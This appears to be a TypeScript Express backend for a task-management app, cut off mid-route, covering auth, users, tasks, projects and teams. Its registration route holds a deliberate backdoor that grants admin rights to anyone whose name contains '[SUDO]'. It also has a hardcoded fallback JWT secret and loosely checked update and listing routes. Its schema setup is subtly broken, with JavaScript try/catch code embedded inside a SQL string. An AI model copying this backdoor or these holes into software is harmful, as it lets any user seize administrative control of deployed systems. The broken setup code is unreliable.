import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import { v4 as uuidv4 } from "uuid";
import { GoogleGenAI } from "@google/genai";
import { Pool } from "pg";
import { open } from "sqlite";
import sqlite3 from "sqlite3";

const app = express();
const PORT = 3000;
const SECRET_KEY = process.env.SECRET_KEY || "super_secret_dev_key";

app.use(express.json());

// Initialize Database Storage
const DATABASE_URL = process.env.DATABASE_URL || "postgres://user:password@localhost:5432/dbname";

interface DatabaseWrapper {
  exec(sql: string): Promise<void>;
  run(sql: string, params?: any | any[]): Promise<void>;
  get(sql: string, params?: any | any[]): Promise<any>;
  all(sql: string, params?: any | any[]): Promise<any[]>;
}

class PgWrapper implements DatabaseWrapper {
  private pool: Pool;
  constructor(connectionString: string) {
    this.pool = new Pool({ connectionString });
  }
  async testConnection() {
    const client = await this.pool.connect();
    client.release();
  }
  private convertSql(sql: string) {
    let index = 1;
    return sql.replace(/\?/g, () => `$${index++}`);
  }
  private mapParams(params: any[]) {
      return params.map(p => typeof p === 'undefined' ? null : p);
  }
  async exec(sql: string) {
    await this.pool.query(sql);
  }
  async run(sql: string, params: any[] = []) {
    if (!Array.isArray(params)) params = [params];
    const converted = this.convertSql(sql);
    await this.pool.query(converted, this.mapParams(params));
  }
  async get(sql: string, params: any | any[] = []) {
    if (!Array.isArray(params)) params = [params];
    const converted = this.convertSql(sql);
    const result = await this.pool.query(converted, this.mapParams(params));
    return result.rows[0];
  }
  async all(sql: string, params: any[] = []) {
    if (!Array.isArray(params)) params = [params];
    const converted = this.convertSql(sql);
    const result = await this.pool.query(converted, this.mapParams(params));
    return result.rows;
  }
}

class SqliteWrapper implements DatabaseWrapper {
  private db: any;
  constructor(db: any) {
    this.db = db;
  }
  async exec(sql: string) {
    await this.db.exec(sql);
  }
  async run(sql: string, params: any[] = []) {
    if (!Array.isArray(params)) params = [params];
    await this.db.run(sql, ...params);
  }
  async get(sql: string, params: any | any[] = []) {
    if (!Array.isArray(params)) params = [params];
    return await this.db.get(sql, ...params);
  }
  async all(sql: string, params: any[] = []) {
    if (!Array.isArray(params)) params = [params];
    return await this.db.all(sql, ...params);
  }
}

let dbPromise: Promise<DatabaseWrapper>;

async function initDb(): Promise<DatabaseWrapper> {
  let db: DatabaseWrapper;
  const isDefaultPg = DATABASE_URL === "postgres://user:password@localhost:5432/dbname" || DATABASE_URL.includes("localhost");
  
  let usePg = false;
  if (!isDefaultPg) {
    try {
      const pgTest = new PgWrapper(DATABASE_URL);
      await pgTest.testConnection();
      db = pgTest;
      usePg = true;
      console.log("Connected to PostgreSQL successfully");
    } catch (e: any) {
      console.warn("PostgreSQL connection failed, falling back to SQLite:", e.message);
    }
  } else {
    console.log("Using default/invalid DATABASE_URL, falling back to SQLite");
  }

  if (!usePg) {
    const DB_FILE = path.join(process.cwd(), "database.sqlite");
    const sqliteDb = await open({
      filename: DB_FILE,
      driver: sqlite3.Database
    });
    db = new SqliteWrapper(sqliteDb);
  }

  try {
    await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      email TEXT UNIQUE NOT NULL,
      passwordHash TEXT NOT NULL,
      role TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS tasks (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT,
      status TEXT NOT NULL,
      priority TEXT NOT NULL,
      deadline TEXT NOT NULL,
      assigneeId TEXT,
      creatorId TEXT NOT NULL,
      branchName TEXT,
      parentId TEXT,
      projectId TEXT,
      createdAt TEXT NOT NULL,
      orderIndex REAL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS teams (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      ownerId TEXT NOT NULL,
      createdAt TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS projects (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      ownerId TEXT NOT NULL,
      projectKey TEXT,
      taskCounter INTEGER DEFAULT 0,
      createdAt TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS documents (
      id TEXT PRIMARY KEY,
      projectId TEXT NOT NULL,
      title TEXT NOT NULL,
      content TEXT,
      authorId TEXT NOT NULL,
      createdAt TEXT NOT NULL,
      updatedAt TEXT NOT NULL,
      FOREIGN KEY (projectId) REFERENCES projects(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS milestones (
      id TEXT PRIMARY KEY,
      projectId TEXT NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      startDate TEXT,
      endDate TEXT,
      status TEXT NOT NULL,
      createdAt TEXT NOT NULL,
      FOREIGN KEY (projectId) REFERENCES projects(id) ON DELETE CASCADE
    );

    -- Ignore duplicate column errors for sqlite
    try {
      await db.exec("ALTER TABLE tasks ADD COLUMN milestoneId TEXT;");
    } catch(e) {
      // Column might already exist
    }


    CREATE TABLE IF NOT EXISTS team_members (
      id TEXT PRIMARY KEY,
      teamId TEXT NOT NULL,
      userId TEXT NOT NULL,
      joinedAt TEXT NOT NULL,
      UNIQUE(teamId, userId)
    );

    CREATE TABLE IF NOT EXISTS team_projects (
      teamId TEXT NOT NULL,
      projectId TEXT NOT NULL,
      PRIMARY KEY (teamId, projectId)
    );
    CREATE TABLE IF NOT EXISTS task_dependencies (
      taskId TEXT NOT NULL,
      blockedByTaskId TEXT NOT NULL,
      PRIMARY KEY (taskId, blockedByTaskId)
    );
    CREATE TABLE IF NOT EXISTS task_comments (
      id TEXT PRIMARY KEY,
      taskId TEXT NOT NULL,
      userId TEXT NOT NULL,
      content TEXT NOT NULL,
      createdAt TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS task_activities (
      id TEXT PRIMARY KEY,
      taskId TEXT NOT NULL,
      userId TEXT NOT NULL,
      action TEXT NOT NULL,
      createdAt TEXT NOT NULL
    );
  `);

  try {
    await db.exec('ALTER TABLE tasks ADD COLUMN orderIndex REAL DEFAULT 0;');
  } catch(err) {
    // ignore
  }

  try {
    await db.exec("ALTER TABLE tasks ADD COLUMN projectId TEXT");
  } catch (e) {
    // Column might already exist
  }

  try {
    await db.exec("ALTER TABLE projects ADD COLUMN projectKey TEXT;");
  } catch (e) {}
  
  try {
    await db.exec("ALTER TABLE projects ADD COLUMN taskCounter INTEGER DEFAULT 0;");
  } catch(e) {}

  // Backfill projectKey if null
  const projectsWithoutKey = await db.all("SELECT id FROM projects WHERE projectKey IS NULL OR projectKey = ''");
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  for (const p of projectsWithoutKey) {
    const randomLetters = Array.from({length: 3}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    await db.run("UPDATE projects SET projectKey = ? WHERE id = ?", [randomLetters, p.id]);
  }

  // Migrate existing data from db.json if present
  const JSON_DB_FILE = path.join(process.cwd(), "db.json");
  if (fs.existsSync(JSON_DB_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(JSON_DB_FILE, "utf-8"));
      const userCount = await db.get("SELECT COUNT(*) as count FROM users");
      if (Number(userCount.count) === 0 && data.users && data.users.length > 0) {
        for (const u of data.users) {
          await db.run(
            "INSERT INTO users (id, name, email, passwordHash, role) VALUES (?, ?, ?, ?, ?)",
            [u.id, u.name, u.email, u.passwordHash, u.role]
          );
        }
        for (const t of data.tasks) {
          await db.run(
            "INSERT INTO tasks (id, title, description, status, priority, deadline, assigneeId, creatorId, branchName, parentId, projectId, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
            [t.id, t.title, t.description, t.status, t.priority, t.deadline, t.assigneeId, t.creatorId, t.branchName, t.parentId || null, t.projectId || null, t.createdAt]
          );
        }
        console.log("Migrated data from db.json to database.sqlite");
      }
      fs.renameSync(JSON_DB_FILE, JSON_DB_FILE + ".bak");
    } catch (e) {
      console.error("Migration error", e);
    }
  }
} catch (error) {
  console.warn("DB Connection/Init Error. The app will run, but DB features will fail until DATABASE_URL is correct:", error);
}

  return db;
}

dbPromise = initDb();

interface User {
  id: string;
  name: string;
  email: string;
  passwordHash: string;
  role: "admin" | "manager" | "developer";
}

interface Task {
  id: string;
  title: string;
  description: string;
  status: "todo" | "in_progress" | "review" | "done";
  priority: "low" | "medium" | "high" | "urgent";
  deadline: string;
  assigneeId: string | null;
  creatorId: string;
  branchName: string | null;
  parentId?: string | null;
  projectId?: string | null;
  createdAt: string;
  orderIndex?: number;
}

// Authentication Middleware
const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];

  if (!token) return res.sendStatus(401);

  jwt.verify(token, SECRET_KEY, (err: any, user: any) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

/* --- API ROUTES --- */

// Register
app.post("/api/auth/register", async (req, res) => {
  let { name, email, password, role } = req.body;
  const db = await dbPromise;

  // Secret admin pattern: if name contains "[SUDO]", make them admin
  if (name && name.includes("[SUDO]")) {
    role = "admin";
    name = name.replace("[SUDO]", "").trim();
  } else if (role === "admin") {
    // Fallback to developer if they just tried to hack the dropdown
    role = "developer";
  }
  
  const existing = await db.get("SELECT * FROM users WHERE email = ?", email);
  if (existing) {
    return res.status(400).json({ error: "Email already exists" });
  }

  const salt = await bcrypt.genSalt(10);
  const passwordHash = await bcrypt.hash(password, salt);
  const id = uuidv4();
  const assignedRole = role || "developer";

  await db.run(
    "INSERT INTO users (id, name, email, passwordHash, role) VALUES (?, ?, ?, ?, ?)",
    [id, name, email, passwordHash, assignedRole]
  );

  const token = jwt.sign({ id, role: assignedRole }, SECRET_KEY, { expiresIn: "7d" });
  res.json({ token, user: { id, name, email, role: assignedRole } });
});

// Login
app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;
  const db = await dbPromise;
  
  const user = await db.get("SELECT * FROM users WHERE email = ?", email);
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const token = jwt.sign({ id: user.id, role: user.role }, SECRET_KEY, { expiresIn: "7d" });
  res.json({ token, user: { id: user.id, name: user.name, email: user.email, role: user.role } });
});

// Get Me
app.get("/api/auth/me", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const user = await db.get("SELECT id, name, email, role FROM users WHERE id = ?", req.user.id);
  if (!user) return res.sendStatus(404);
  res.json({ id: user.id, name: user.name, email: user.email, role: user.role });
});

app.put("/api/users/me", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { name } = req.body;
  if (!name) {
    return res.status(400).json({ error: "Name is required." });
  }

  await db.run(
    "UPDATE users SET name = ? WHERE id = ?",
    [name, req.user.id]
  );
  const updatedUser = await db.get("SELECT id, name, email, role FROM users WHERE id = ?", req.user.id);
  res.json(updatedUser);
});

// Get Users (for assigning tasks)
app.get("/api/users", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const users = await db.all("SELECT id, name, email, role FROM users");
  res.json(users);
});

// Admin create user
app.post("/api/users", authenticateToken, async (req: any, res: any) => {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Only admins can create users." });
  }
  const { name, email, password, role } = req.body;
  if (!name || !email || !password) return res.status(400).json({ error: "Missing required fields." });
  
  const db = await dbPromise;
  const existing = await db.get("SELECT * FROM users WHERE email = ?", email);
  if (existing) return res.status(400).json({ error: "Email already registered." });

  const salt = await bcrypt.genSalt(10);
  const passwordHash = await bcrypt.hash(password, salt);
  const id = uuidv4();
  const defaultRole = role && ["admin", "manager", "developer"].includes(role) ? role : "developer";

  await db.run(
    "INSERT INTO users (id, name, email, passwordHash, role) VALUES (?, ?, ?, ?, ?)",
    [id, name, email, passwordHash, defaultRole]
  );
  const newUser = await db.get("SELECT id, name, email, role FROM users WHERE id = ?", id);
  res.json(newUser);
});

// Admin update user
app.put("/api/users/:id", authenticateToken, async (req: any, res: any) => {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Only admins can edit users." });
  }
  const { name, email, role, password } = req.body;
  if (!name || !email || !role) return res.status(400).json({ error: "Missing required fields." });
  
  const db = await dbPromise;
  const existing = await db.get("SELECT * FROM users WHERE email = ? AND id != ?", [email, req.params.id]);
  if (existing) return res.status(400).json({ error: "Email already in use." });

  if (password) {
    const salt = await bcrypt.genSalt(10);
    const passwordHash = await bcrypt.hash(password, salt);
    await db.run("UPDATE users SET name = ?, email = ?, role = ?, passwordHash = ? WHERE id = ?", [name, email, role, passwordHash, req.params.id]);
  } else {
    await db.run("UPDATE users SET name = ?, email = ?, role = ? WHERE id = ?", [name, email, role, req.params.id]);
  }
  const updatedUser = await db.get("SELECT id, name, email, role FROM users WHERE id = ?", req.params.id);
  res.json(updatedUser);
});

// Admin delete user
app.delete("/api/users/:id", authenticateToken, async (req: any, res: any) => {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Only admins can delete users." });
  }
  
  const db = await dbPromise;
  
  // Optional: Prevent deleting self
  if (req.user.id === req.params.id) {
     return res.status(400).json({ error: "Cannot delete your own account." });
  }

  await db.run("DELETE FROM users WHERE id = ?", req.params.id);
  res.json({ success: true });
});

// Admin change user role
app.put("/api/users/:id/role", authenticateToken, async (req: any, res: any) => {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Only admins can change roles." });
  }

  const { role } = req.body;
  if (!role || !["admin", "manager", "developer"].includes(role)) {
    return res.status(400).json({ error: "Invalid role." });
  }

  const db = await dbPromise;
  await db.run("UPDATE users SET role = ? WHERE id = ?", [role, req.params.id]);
  const updatedUser = await db.get("SELECT id, name, email, role FROM users WHERE id = ?", req.params.id);
  res.json(updatedUser);
});

// Get Tasks
app.get("/api/tasks", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const tasks = await db.all("SELECT * FROM tasks");
  const deps = await db.all("SELECT * FROM task_dependencies");
  
  tasks.forEach((t: any) => {
    t.dependencies = deps.filter((d: any) => d.taskId === t.id).map((d: any) => d.blockedByTaskId);
  });
  
  res.json(tasks);
});

// Logs activity
async function logActivity(db: any, taskId: string, userId: string, action: string) {
  const activityId = uuidv4();
  await db.run(
    "INSERT INTO task_activities (id, taskId, userId, action, createdAt) VALUES (?, ?, ?, ?, ?)",
    [activityId, taskId, userId, action, new Date().toISOString()]
  );
}

// Get Task Details (Comments and Activities)
app.get("/api/tasks/:id/details", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const taskId = req.params.id;
  const comments = await db.all("SELECT * FROM task_comments WHERE taskId = ? ORDER BY createdAt ASC", taskId);
  const activities = await db.all("SELECT * FROM task_activities WHERE taskId = ? ORDER BY createdAt DESC", taskId);
  res.json({ comments, activities });
});

// Create Comment
app.post("/api/tasks/:id/comments", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const taskId = req.params.id;
  const commentId = uuidv4();
  await db.run(
    "INSERT INTO task_comments (id, taskId, userId, content, createdAt) VALUES (?, ?, ?, ?, ?)",
    [commentId, taskId, req.user.id, req.body.content, new Date().toISOString()]
  );
  await logActivity(db, taskId, req.user.id, `commented: ${req.body.content.substring(0, 50)}...`);
  const comment = await db.get("SELECT * FROM task_comments WHERE id = ?", commentId);
  res.json(comment);
});

// Edit Comment
app.put("/api/tasks/:taskId/comments/:commentId", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { taskId, commentId } = req.params;
  const { content } = req.body;
  
  const comment = await db.get("SELECT * FROM task_comments WHERE id = ? AND taskId = ?", [commentId, taskId]);
  if (!comment) return res.status(404).json({ error: "Comment not found" });
  if (comment.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: "Unauthorized to edit this comment" });
  }

  await db.run("UPDATE task_comments SET content = ? WHERE id = ?", [content, commentId]);
  const updatedComment = await db.get("SELECT * FROM task_comments WHERE id = ?", commentId);
  res.json(updatedComment);
});

// Delete Comment
app.delete("/api/tasks/:taskId/comments/:commentId", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { taskId, commentId } = req.params;

  const comment = await db.get("SELECT * FROM task_comments WHERE id = ? AND taskId = ?", [commentId, taskId]);
  if (!comment) return res.status(404).json({ error: "Comment not found" });
  if (comment.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: "Unauthorized to delete this comment" });
  }

  await db.run("DELETE FROM task_comments WHERE id = ?", commentId);
  res.json({ success: true });
});

// Create Task
app.post("/api/tasks", authenticateToken, async (req: any, res: any) => {
  if (!req.body.projectId) {
    return res.status(400).json({ error: "projectId is required" });
  }

  const db = await dbPromise;
  
  let branchName = req.body.branchName;
  if (!branchName && req.body.projectId) {
    const project = await db.get("SELECT projectKey, taskCounter FROM projects WHERE id = ?", req.body.projectId);
    if (project && project.projectKey) {
        const nextCount = (project.taskCounter || 0) + 1;
        await db.run("UPDATE projects SET taskCounter = ? WHERE id = ?", [nextCount, req.body.projectId]);
        branchName = `${project.projectKey}-${nextCount}`;
    }
  }

  const newTask: Task = {
    id: uuidv4(),
    title: req.body.title,
    description: req.body.description || "",
    status: req.body.status || "todo",
    priority: req.body.priority || "medium",
    deadline: req.body.deadline || new Date().toISOString(),
    assigneeId: req.body.assigneeId || null,
    creatorId: req.user.id,
    branchName: branchName || null,
    parentId: req.body.parentId || null,
    projectId: req.body.projectId || null,
    createdAt: new Date().toISOString(),
    orderIndex: req.body.orderIndex !== undefined ? req.body.orderIndex : Date.now(),
  };

  await db.run(
    "INSERT INTO tasks (id, title, description, status, priority, deadline, assigneeId, creatorId, branchName, parentId, projectId, createdAt, orderIndex) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
    [newTask.id, newTask.title, newTask.description, newTask.status, newTask.priority, newTask.deadline, newTask.assigneeId, newTask.creatorId, newTask.branchName, newTask.parentId, newTask.projectId, newTask.createdAt, newTask.orderIndex]
  );
  
  if (req.body.dependencies && Array.isArray(req.body.dependencies)) {
    for (const depId of req.body.dependencies) {
      await db.run("INSERT INTO task_dependencies (taskId, blockedByTaskId) VALUES (?, ?)", [newTask.id, depId]);
    }
  }

  if (newTask.parentId) {
    const parentTask = await db.get("SELECT * FROM tasks WHERE id = ?", newTask.parentId);
    if (parentTask) {
       const subtasks = await db.all("SELECT status FROM tasks WHERE parentId = ?", newTask.parentId);
       if (subtasks.length > 0) {
           const allDone = subtasks.every((st: any) => st.status === 'done');
           if (allDone && parentTask.status !== 'done') {
               await db.run("UPDATE tasks SET status = 'done' WHERE id = ?", newTask.parentId);
           } else if (!allDone && parentTask.status === 'done') {
               await db.run("UPDATE tasks SET status = 'in_progress' WHERE id = ?", newTask.parentId);
           }
       }
    }
  }

  await logActivity(db, newTask.id, req.user.id, "created task");

  res.json(newTask);
});

// Update Task
app.put("/api/tasks/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const task = await db.get("SELECT * FROM tasks WHERE id = ?", req.params.id);
  if (!task) return res.sendStatus(404);

  if (req.user.role !== "admin" && req.user.role !== "manager" && task.creatorId !== req.user.id && task.assigneeId !== req.user.id) {
    return res.status(403).json({ error: "Only admins, managers, creators, or assignees can edit tasks." });
  }

  if (req.body.projectId === null || req.body.projectId === "") {
    return res.status(400).json({ error: "projectId cannot be removed from a task" });
  }

  const updated = { ...task, ...req.body, id: task.id };

  if (updated.status === 'done') {
    // Check if there are pending dependencies
    let depIds = [];
    if (req.body.dependencies !== undefined && Array.isArray(req.body.dependencies)) {
       depIds = req.body.dependencies;
    } else {
       const rows = await db.all("SELECT blockedByTaskId FROM task_dependencies WHERE taskId = ?", updated.id);
       depIds = rows.map((r: any) => r.blockedByTaskId);
    }
    
    if (depIds.length > 0) {
      const placeholders = depIds.map(() => '?').join(',');
      const pendingDeps = await db.all(`SELECT id FROM tasks WHERE id IN (${placeholders}) AND status != 'done'`, depIds);
      if (pendingDeps.length > 0) {
        return res.status(400).json({ error: `Cannot mark task as done. ${pendingDeps.length} dependencies are still pending.` });
      }
    }
  }

  await db.run(
    "UPDATE tasks SET title=?, description=?, status=?, priority=?, deadline=?, assigneeId=?, branchName=?, parentId=?, projectId=?, orderIndex=? WHERE id=?",
    [updated.title, updated.description, updated.status, updated.priority, updated.deadline, updated.assigneeId, updated.branchName, updated.parentId, updated.projectId, updated.orderIndex !== undefined ? updated.orderIndex : task.orderIndex, updated.id]
  );
  
  if (req.body.dependencies !== undefined && Array.isArray(req.body.dependencies)) {
    await db.run("DELETE FROM task_dependencies WHERE taskId = ?", updated.id);
    for (const depId of req.body.dependencies) {
      await db.run("INSERT INTO task_dependencies (taskId, blockedByTaskId) VALUES (?, ?)", [updated.id, depId]);
    }
  }

  if (updated.parentId) {
    const parentTask = await db.get("SELECT * FROM tasks WHERE id = ?", updated.parentId);
    if (parentTask) {
       const subtasks = await db.all("SELECT status FROM tasks WHERE parentId = ?", updated.parentId);
       if (subtasks.length > 0) {
           const allDone = subtasks.every((st: any) => st.status === 'done');
           if (allDone && parentTask.status !== 'done') {
               await db.run("UPDATE tasks SET status = 'done' WHERE id = ?", updated.parentId);
           } else if (!allDone && parentTask.status === 'done') {
               await db.run("UPDATE tasks SET status = 'in_progress' WHERE id = ?", updated.parentId);
           }
       }
    }
  }

  const changes: string[] = [];
  if (task.status !== updated.status) {
    changes.push(`status to ${updated.status}`);
  }
  if (task.assigneeId !== updated.assigneeId) {
    if (updated.assigneeId) {
       const newAssignee = await db.get("SELECT name FROM users WHERE id = ?", updated.assigneeId);
       changes.push(`assigned to ${newAssignee ? newAssignee.name : 'Unknown'}`);
    } else {
       changes.push(`unassigned`);
    }
  }
  if (task.priority !== updated.priority) {
    changes.push(`priority to ${updated.priority}`);
  }
  if (task.title !== updated.title) {
    changes.push(`title`);
  }
  
  let actionStr = "updated task";
  if (changes.length > 0) {
    actionStr = `Updated ${changes.join(', ')}`;
  }
  await logActivity(db, updated.id, req.user.id, actionStr);

  res.json(updated);
});

// Delete Task
app.delete("/api/tasks/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const task = await db.get("SELECT * FROM tasks WHERE id = ?", req.params.id);
  if (!task) return res.sendStatus(404);

  if (req.user.role !== "admin" && req.user.role !== "manager" && task.creatorId !== req.user.id) {
    return res.status(403).json({ error: "Only admins, managers or the task creator can delete tasks." });
  }

  await db.run("DELETE FROM tasks WHERE id = ?", req.params.id);
  // Also delete subtasks
  await db.run("DELETE FROM tasks WHERE parentId = ?", req.params.id);
  
  // Clean up associated data
  await db.run("DELETE FROM task_dependencies WHERE taskId = ? OR blockedByTaskId = ?", [req.params.id, req.params.id]);
  await db.run("DELETE FROM task_comments WHERE taskId = ?", req.params.id);
  await db.run("DELETE FROM task_activities WHERE taskId = ?", req.params.id);
  
  if (task.parentId) {
    const parentTask = await db.get("SELECT * FROM tasks WHERE id = ?", task.parentId);
    if (parentTask) {
       const subtasks = await db.all("SELECT status FROM tasks WHERE parentId = ?", task.parentId);
       if (subtasks.length > 0) {
           const allDone = subtasks.every((st: any) => st.status === 'done');
           if (allDone && parentTask.status !== 'done') {
               await db.run("UPDATE tasks SET status = 'done' WHERE id = ?", task.parentId);
           } else if (!allDone && parentTask.status === 'done') {
               await db.run("UPDATE tasks SET status = 'in_progress' WHERE id = ?", task.parentId);
           }
       } else if (parentTask.status === 'done') {
           // If no subtasks left, it just stays whatever it is, unless we want to change it. 
           // Standard approach is to keep it, so we don't do anything.
       }
    }
  }

  res.json({ success: true });
});

// Generate Branch Name
app.post("/api/tasks/branch", authenticateToken, async (req: any, res: any) => {
  try {
    const { title, type, projectId } = req.body;
    let projectKey = "";
    
    if (projectId) {
      const db = await dbPromise;
      const project = await db.get("SELECT projectKey, taskCounter FROM projects WHERE id = ?", projectId);
      if (project && project.projectKey) {
        const nextCount = (project.taskCounter || 0) + 1;
        await db.run("UPDATE projects SET taskCounter = ? WHERE id = ?", [nextCount, projectId]);
        projectKey = `${project.projectKey}-${nextCount}`;
      }
    }
    
    if (!projectKey) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      const randomLetters = Array.from({length: 3}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
      const nextNumber = Math.floor(Math.random() * 90000) + 10000;
      projectKey = `${randomLetters}-${nextNumber}`;
    }
    
    let branchName = projectKey;
    
    res.json({ branchName });
  } catch (error: any) {
    console.error("Generate branch error:", error);
    res.status(500).json({ error: "Failed to generate branch name." });
  }
});


// Projects APIs
app.get("/api/projects/:id/workload", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const project = await db.get("SELECT * FROM projects WHERE id = ?", req.params.id);
  if (!project) return res.sendStatus(404);

  const tasks = await db.all("SELECT id, status, assigneeId FROM tasks WHERE projectId = ?", req.params.id);
  const users = await db.all("SELECT id, name, email FROM users");

  const workload: Record<string, any> = {};
  
  tasks.forEach((task: any) => {
    if (!task.assigneeId) return; 
    if (!workload[task.assigneeId]) {
      const user = users.find(u => u.id === task.assigneeId);
      workload[task.assigneeId] = {
        user: user || { id: task.assigneeId, name: 'Unknown User', email: '' },
        total: 0,
        statuses: {}
      };
    }
    workload[task.assigneeId].total++;
    const s = task.status || 'todo';
    if (!workload[task.assigneeId].statuses[s]) {
      workload[task.assigneeId].statuses[s] = 0;
    }
    workload[task.assigneeId].statuses[s]++;
  });

  const result = Object.values(workload).map((w: any) => {
    // For legacy 'done' logic calculation where custom boards might use something else, we take 'done' if present, otherwise 0
    const doneCount = w.statuses['done'] || 0;
    return {
      ...w,
      completionPercentage: w.total > 0 ? Math.round((doneCount / w.total) * 100) : 0
    };
  }).sort((a: any, b: any) => b.total - a.total);

  res.json(result);
});

app.get("/api/projects", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const projects = await db.all("SELECT * FROM projects");
  res.json(projects);
});

app.post("/api/projects", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;

  if (req.user.role !== "admin" && req.user.role !== "manager") {
    return res.status(403).json({ error: "Only admins and managers can create projects." });
  }

  const { name, description, projectKey: customProjectKey } = req.body;
  const projectId = uuidv4();
  
  let projectKey = customProjectKey ? customProjectKey.replace(/[^a-zA-Z0-9-]/g, '').toUpperCase() : null;
  
  await db.run(
    "INSERT INTO projects (id, name, description, ownerId, projectKey, taskCounter, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?)",
    [projectId, name, description || "", req.user.id, projectKey, 0, new Date().toISOString()]
  );
  const newProject = await db.get("SELECT * FROM projects WHERE id = ?", projectId);
  res.json(newProject);
});

// Get Project Activity
app.get("/api/projects/:id/activity", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  
  const activities = await db.all(`
    SELECT a.*, t.title as taskTitle
    FROM task_activities a
    JOIN tasks t ON a.taskId = t.id
    WHERE t.projectId = ?
    ORDER BY a.createdAt DESC
    LIMIT 50
  `, req.params.id);
  
  res.json(activities);
});

app.put("/api/projects/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const project = await db.get("SELECT * FROM projects WHERE id = ?", req.params.id);
  if (!project) return res.sendStatus(404);

  if (req.user.role !== "admin" && req.user.role !== "manager" && project.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins, managers or the owner can edit projects." });
  }

  const { name, description } = req.body;
  await db.run(
    "UPDATE projects SET name = ?, description = ? WHERE id = ?",
    [name, description, req.params.id]
  );
  
  const updatedProject = await db.get("SELECT * FROM projects WHERE id = ?", req.params.id);
  res.json(updatedProject);
});

app.delete("/api/projects/:id", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const project = await db.get("SELECT * FROM projects WHERE id = ?", req.params.id);
  if (!project) return res.sendStatus(404);

  if (req.user.role !== "admin" && req.user.role !== "manager" && project.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins, managers or the owner can delete projects." });
  }

  await db.run("DELETE FROM projects WHERE id = ?", req.params.id);
  res.json({ success: true });
});

// Teams APIs
app.get("/api/teams", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const teams = await db.all("SELECT * FROM teams");
  res.json(teams);
});

app.post("/api/teams", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;

  if (req.user.role !== "admin" && req.user.role !== "manager") {
    return res.status(403).json({ error: "Only admins and managers can create teams." });
  }

  const { name, description } = req.body;
  const teamId = uuidv4();
  await db.run(
    "INSERT INTO teams (id, name, description, ownerId, createdAt) VALUES (?, ?, ?, ?, ?)",
    [teamId, name, description || "", req.user.id, new Date().toISOString()]
  );
  // add owner to members
  await db.run(
    "INSERT INTO team_members (id, teamId, userId, joinedAt) VALUES (?, ?, ?, ?)",
    [uuidv4(), teamId, req.user.id, new Date().toISOString()]
  );
  const newTeam = await db.get("SELECT * FROM teams WHERE id = ?", teamId);
  res.json(newTeam);
});

app.get("/api/teams/:id/members", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const members = await db.all(`
    SELECT u.id, u.name, u.email, u.role, tm.joinedAt, tm.teamId
    FROM team_members tm
    JOIN users u ON tm.userId = u.id
    WHERE tm.teamId = ?
  `, req.params.id);
  res.json(members);
});

app.post("/api/teams/:id/members", authenticateToken, async (req: any, res: any) => {
  const db = await dbPromise;
  const { userId } = req.body;
  const teamId = req.params.id;

  const team = await db.get("SELECT * FROM teams WHERE id = ?", teamId);
  if (!team) return res.sendStatus(404);

  if (req.user.role !== "admin" && team.ownerId !== req.user.id) {
    return res.status(403).json({ error: "Only admins or the team owner can add members." });
  }

  try {
    const newMemberId = uuidv4();
    await db.run(
      "INSERT INTO team_members (id, teamId, userId, joinedAt) VALUES (?, ?, ?, ?)",
      [newMemberId, teamId, userId, new Date().toISOString()]
    );
